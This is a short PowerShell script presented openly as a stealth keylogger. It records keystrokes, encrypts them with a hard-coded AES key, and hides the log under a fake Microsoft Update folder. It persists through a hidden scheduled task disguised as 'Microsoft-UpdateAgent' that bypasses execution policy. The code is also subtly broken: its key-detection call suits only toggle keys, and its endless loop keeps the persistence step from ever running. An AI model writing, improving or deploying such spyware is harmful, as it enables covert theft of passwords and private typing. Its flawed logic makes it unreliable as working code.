# Keylogger v1.1 (Stealth Encrypted Version)

# AES Encryption Setup
$k = [System.Text.Encoding]::UTF8.GetBytes('MyS3cr3tK3y12345')
$iv = New-Object Byte[] 16
(New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($iv)

# Generate random log file path
$f = "$env:APPDATA\Microsoft\Update\{0}" -f ([guid]::NewGuid())
$d = "$env:APPDATA\Microsoft\Update\"
mkdir $d -ea 0 | Out-Null

# Create AES encryptor
$a = [System.Security.Cryptography.Aes]::Create()
$a.Key = $k
$a.IV = $iv
$e = $a.CreateEncryptor()

# Load key detection assembly
Add-Type -AssemblyName System.Windows.Forms
$h = @()

# Keylogging loop
while ($true) {
    Start-Sleep -Milliseconds 300
    foreach ($c in 1..254) {
        if ([System.Windows.Forms.Control]::IsKeyLocked($c)) {
            $b = [System.Text.Encoding]::UTF8.GetBytes([char]$c)
            $x = $e.TransformFinalBlock($b, 0, $b.Length)
            [System.IO.File]::WriteAllBytes($f, $iv + $x)
        }
    }
}

# Scheduled task setup
$taskName = "Microsoft-UpdateAgent"
$taskPath = "$env:APPDATA\Microsoft\Update\update.ps1"
Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $taskPath -Force

schtasks /create /tn $taskName /tr "powershell -w h -NoP -NonI -ExecutionPolicy Bypass -File `"$taskPath`"" /sc onlogon /f | Out-Null
